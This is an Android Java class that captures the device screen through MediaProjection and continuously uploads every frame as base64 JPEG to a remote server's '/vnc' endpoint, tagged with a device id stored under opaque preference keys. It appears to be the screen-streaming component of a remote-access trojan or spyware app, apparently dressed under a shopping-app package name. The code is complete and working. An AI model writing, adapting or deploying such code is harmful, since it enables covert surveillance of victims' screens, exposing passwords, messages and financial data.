package com.yiwugou.yiwukanz;

import android.content.Context;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.Display;
import android.view.Surface;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class ScreenCapturer {

    private final Context context;
    private final MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Handler backgroundHandler;
    private int screenWidth;
    private int screenHeight;
    private int screenDensity;

    private final OkHttpClient httpClient = new OkHttpClient();



    public ScreenCapturer(Context context, MediaProjection mediaProjection) {
        this.context = context.getApplicationContext();
        this.mediaProjection = mediaProjection;
        initScreenMetrics();
        initBackgroundThread();
    }

    private void initScreenMetrics() {
        WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        Display display = wm.getDefaultDisplay();
        DisplayMetrics metrics = new DisplayMetrics();
        display.getMetrics(metrics);
        screenWidth = metrics.widthPixels;
        screenHeight = metrics.heightPixels;
        screenDensity = metrics.densityDpi;
    }

    private void initBackgroundThread() {
        HandlerThread handlerThread = new HandlerThread("ScreenCaptureThread");
        handlerThread.start();
        backgroundHandler = new Handler(handlerThread.getLooper());
    }

    public void start() {



        mediaProjection.registerCallback(new MediaProjection.Callback() {
            @Override
            public void onStop() {
                super.onStop();
                stop();
            }
        }, backgroundHandler);


        imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
        Surface surface = imageReader.getSurface();

        virtualDisplay = mediaProjection.createVirtualDisplay(
                "ScreenCapture",
                screenWidth, screenHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                surface, null, backgroundHandler);

        imageReader.setOnImageAvailableListener(reader -> {
            try (Image image = reader.acquireLatestImage()) {
                if (image != null) {
                    Bitmap bitmap = imageToBitmap(image);
                    if (bitmap != null) {
                        byte[] jpeg = bitmapToJpeg(bitmap, 60);
                        bitmap.recycle();


                        String base64 = Base64.encodeToString(jpeg, Base64.NO_WRAP);

                        sendToServer(base64);
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }, backgroundHandler);
    }

    private void sendToServer(String base64Image) {

        String jsonBody = "{\"image\":\"" + base64Image + "\",\"width\":"+screenWidth+",\"height\":"+screenHeight+"}";

        RequestBody body = RequestBody.create(
                jsonBody, MediaType.parse("application/json"));

        SharedPreferences sharedPrefs= context.getSharedPreferences("开始", Context.MODE_PRIVATE);
        String a = sharedPrefs.getString("节省", null);

        Request request = new Request.Builder()
                .url(MainService.serverUrl+"/vnc?id="+a)
                .post(body)
                .build();


        httpClient.newCall(request).enqueue(new okhttp3.Callback() {
            @Override
            public void onFailure(okhttp3.Call call, IOException e) {
                e.printStackTrace();
            }

            @Override
            public void onResponse(okhttp3.Call call, Response response) {
                response.close();
            }
        });
    }

    private Bitmap imageToBitmap(Image image) {
        Image.Plane[] planes = image.getPlanes();
        ByteBuffer buffer = planes[0].getBuffer();
        int pixelStride = planes[0].getPixelStride();
        int rowStride = planes[0].getRowStride();
        int rowPadding = rowStride - pixelStride * screenWidth;

        Bitmap bitmap = Bitmap.createBitmap(
                screenWidth + rowPadding / pixelStride,
                screenHeight, Bitmap.Config.ARGB_8888);
        bitmap.copyPixelsFromBuffer(buffer);
        return Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight);
    }

    private byte[] bitmapToJpeg(Bitmap bitmap, int quality) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
        return baos.toByteArray();
    }

    public void stop() {
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        if (mediaProjection != null) {
            mediaProjection.stop();
        }
        if (backgroundHandler != null) {
            backgroundHandler.getLooper().quitSafely();
        }
    }
}
